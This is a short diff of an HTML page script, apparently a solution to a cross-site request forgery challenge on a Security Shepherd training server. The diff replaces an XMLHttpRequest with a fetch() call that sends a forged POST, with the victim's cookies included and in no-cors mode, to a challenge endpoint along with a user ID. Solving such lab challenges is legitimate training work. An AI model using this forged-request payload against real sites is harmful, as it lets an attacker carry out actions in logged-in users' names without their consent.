@@ -2,10 +2,14 @@
 <head>
 <script>
 function put() {
-    var x = new XMLHttpRequest();
-    x.open("POST","https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengejson/plusplus",true);
-    x.setRequestHeader("Content-Type", "application/json");
-    x.send(JSON.stringify({"userid":"d35874530d87a07ad3cd5864affdf5736743f5ad"})); 
+    fetch('https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengetwo/plusplus', {
+        method: 'POST',
+        credentials: "include",
+        mode: "no-cors",
+        body: JSON.stringify({
+            "userId": "d35874530d87a07ad3cd5864affdf5736743f5ad"
+        })
+    })
 }
 </script>
 
